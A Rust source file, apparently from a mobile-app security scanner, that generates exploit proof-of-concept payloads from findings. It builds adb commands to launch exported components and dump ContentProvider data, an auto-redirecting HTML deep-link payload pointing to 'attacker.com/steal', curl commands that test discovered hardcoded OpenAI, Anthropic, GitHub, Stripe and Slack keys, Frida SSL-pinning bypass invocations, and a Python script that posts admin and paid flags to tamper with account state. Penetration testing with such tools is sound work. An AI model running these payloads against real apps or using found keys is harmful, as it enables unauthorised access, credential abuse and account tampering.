use crate::domain::mobhunt::models::{Finding, Platform};
use regex::Regex;

/// Exploit PoC type
#[derive(Clone, Debug, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub enum PocType {
    AdbCommand,
    CurlCommand,
    HtmlPayload,
    FridaCommand,
    PythonScript,
}

/// Generated Proof of Concept structure
#[derive(Clone, Debug, serde::Serialize, serde::Deserialize)]
pub struct ExploitPoc {
    pub poc_type: PocType,
    pub title: String,
    pub description: String,
    pub payload_or_command: String,
    pub execution_instructions: String,
}

/// Synthesize a real, genuine exploit verification command or payload for a Finding
pub fn generate_poc_for_finding(finding: &Finding, package_or_bundle_id: Option<&str>) -> Option<ExploitPoc> {
    let rule_id = &finding.rule_id;
    let title = &finding.title;
    let desc = &finding.description;
    let snippet = &finding.snippet;
    let target_id = package_or_bundle_id.unwrap_or("com.target.app");

    // 1. Exported Activity / Component (SEC-AND-EXP-*)
    if rule_id.contains("SEC-AND-EXP-") || title.contains("Exported") && title.contains("Activity") {
        // Try extracting component name from title or snippet
        let comp_name = extract_component_name(title).or_else(|| extract_component_name(snippet)).unwrap_or_else(|| ".MainActivity".to_string());
        let full_cmp = if comp_name.starts_with('.') {
            format!("{target_id}/{target_id}{comp_name}")
        } else if comp_name.contains('/') {
            comp_name.clone()
        } else {
            format!("{target_id}/{comp_name}")
        };


        let cmd = format!("adb shell am start -n {full_cmp}");
        return Some(ExploitPoc {
            poc_type: PocType::AdbCommand,
            title: format!("ADB Component Launch PoC: {comp_name}"),
            description: "Launches the exported component directly via ADB, bypassing login or permission checks.".to_string(),
            payload_or_command: cmd,
            execution_instructions: "Run this command on a connected USB test device or emulator with the app installed.".to_string(),
        });
    }

    // 2. Exported ContentProvider (SEC-AND-CP-*)
    if rule_id.starts_with("SEC-AND-CP-") || title.contains("ContentProvider") {
        let authority = extract_authority(desc).or_else(|| extract_authority(snippet)).unwrap_or_else(|| format!("{target_id}.provider"));
        let cmd = format!("adb shell content query --uri content://{authority}/");
        return Some(ExploitPoc {
            poc_type: PocType::AdbCommand,
            title: format!("ADB ContentProvider Query PoC: {authority}"),
            description: "Queries the unprotected ContentProvider from the command line to dump records without authentication.".to_string(),
            payload_or_command: cmd,
            execution_instructions: "Execute in terminal. If records are returned, the ContentProvider allows unauthorized access.".to_string(),
        });
    }

    // 3. Deep Link & Intent Redirection (SEC-AND-DEEP-* / SEC-AND-INTENT-*)
    if rule_id.contains("DEEP") || rule_id.contains("INTENT") || title.contains("Deep Link") {
        let scheme = extract_scheme(desc).or_else(|| extract_scheme(snippet)).unwrap_or_else(|| "myapp".to_string());
        let cmd = format!(
            "adb shell am start -a android.intent.action.VIEW -d \"{scheme}://victim.com/auth?redirect=https://attacker.com/steal\""
        );
        let html_payload = format!(
            r#"<!DOCTYPE html>
<html>
<head><title>Deep Link Exploit PoC</title></head>
<body>
  <h1>Triggering Deep Link Exploit</h1>
  <script>
    window.location.href = "{scheme}://victim.com/auth?redirect=https://attacker.com/steal";
  </script>
</body>
</html>"#
        );

        return Some(ExploitPoc {
            poc_type: PocType::HtmlPayload,
            title: format!("Deep Link Exploit Payload ({scheme}://)"),
            description: "Triggers deep link intent hijacking or unvalidated redirect via browser or ADB.".to_string(),
            payload_or_command: format!("# Option A: ADB CLI\n{cmd}\n\n# Option B: Web Browser Payload\n{html_payload}"),
            execution_instructions: "Host the HTML file or run the adb command to test if the app opens and redirects.".to_string(),
        });
    }

    // 4. Hardcoded Cloud & AI Secrets (SEC-SEC-*)
    if rule_id.starts_with("SEC-SEC-") || title.contains("Secret") || title.contains("API Key") {
        let key = extract_secret_key(snippet).unwrap_or_else(|| "REPLACE_WITH_DETECTED_KEY".to_string());

        let curl_cmd = if title.contains("OpenAI") {
            format!(r#"curl -s https://api.openai.com/v1/models -H "Authorization: Bearer {key}""#)
        } else if title.contains("Anthropic") {
            format!(r#"curl -s https://api.anthropic.com/v1/models -H "x-api-key: {key}" -H "anthropic-version: 2023-06-01""#)
        } else if title.contains("GitHub") {
            format!(r#"curl -s https://api.github.com/user -H "Authorization: Bearer {key}""#)
        } else if title.contains("Stripe") {
            format!(r#"curl -s https://api.stripe.com/v1/balance -u {key}:"#)
        } else if title.contains("Slack") {
            format!(r#"curl -s https://slack.com/api/auth.test -H "Authorization: Bearer {key}""#)
        } else {
            format!(r#"curl -s -I "https://api.target.com/v1/user" -H "Authorization: Bearer {key}""#)
        };

        return Some(ExploitPoc {
            poc_type: PocType::CurlCommand,
            title: format!("Credential Verification cURL PoC: {}", finding.title),
            description: "Queries the upstream provider API to verify if the hardcoded secret is active and authorized.".to_string(),
            payload_or_command: curl_cmd,
            execution_instructions: "Run the curl command in your terminal to verify API authentication response.".to_string(),
        });
    }

    // 5. SSL Pinning / Certificate Pinner Detected
    if rule_id.contains("SSL") || title.contains("SSL Pinning") || title.contains("CertificatePinner") {
        let frida_cmd = match finding.platform {
            Platform::Android => format!("frida -U -f {target_id} -l ./scripts/android_pinning_bypass.js --no-pause"),
            Platform::Ios => format!("frida -U -f {target_id} -l ./scripts/ios_sectrust_bypass.js --no-pause"),
            _ => format!("frida -U -f {target_id} -l ./scripts/flutter_boringssl_bypass.js --no-pause"),
        };

        return Some(ExploitPoc {
            poc_type: PocType::FridaCommand,
            title: "Dynamic SSL Pinning Bypass Hook".to_string(),
            description: "Attaches Frida to the running application to dynamically hook and bypass the identified certificate pinner.".to_string(),
            payload_or_command: frida_cmd,
            execution_instructions: "Ensure Frida server is running on the USB device and execute the Frida command.".to_string(),
        });
    }

    // 6. Generic or Logic Flaw PoC
    if rule_id.contains("LOGIC") || title.contains("Logic Flaw") || title.contains("Payment") {
        return Some(ExploitPoc {
            poc_type: PocType::PythonScript,
            title: format!("Logic Flaw Audit Script: {}", finding.title),
            description: "Tests client-side trust assumptions by intercepting or replaying state updates.".to_string(),
            payload_or_command: format!(
                r#"# Python Verification Script for {title}
import requests

url = "https://api.{target_id}/v1/account"
headers = {{"User-Agent": "{target_id}/1.0"}}
# Test state tampering
payload = {{"is_admin": True, "is_paid": True}}
resp = requests.post(url, json=payload, headers=headers)
print(f"Status: {{resp.status_code}}, Body: {{resp.text}}")
"#
            ),
            execution_instructions: "Execute using python3 -m script.py with your local proxy configured to observe server validation.".to_string(),
        });
    }

    None
}

fn extract_component_name(text: &str) -> Option<String> {
    let re = Regex::new(r#"(?:Activity|Receiver|Service):\s*([a-zA-Z0-9_.]+)"#).ok()?;
    re.captures(text).map(|c| c.get(1).unwrap().as_str().to_string())
}

fn extract_authority(text: &str) -> Option<String> {
    let re = Regex::new(r#"authority:\s*'([^']+)'"#).ok()?;
    re.captures(text).map(|c| c.get(1).unwrap().as_str().to_string())
}

fn extract_scheme(text: &str) -> Option<String> {
    let re = Regex::new(r#"scheme\s*'([a-zA-Z0-9_\-]+)'"#).ok()?;
    re.captures(text).map(|c| c.get(1).unwrap().as_str().to_string())
}

fn extract_secret_key(snippet: &str) -> Option<String> {
    let re = Regex::new(r#"["']([a-zA-Z0-9_\-]{16,64})["']"#).ok()?;
    re.captures(snippet).map(|c| c.get(1).unwrap().as_str().to_string())
}
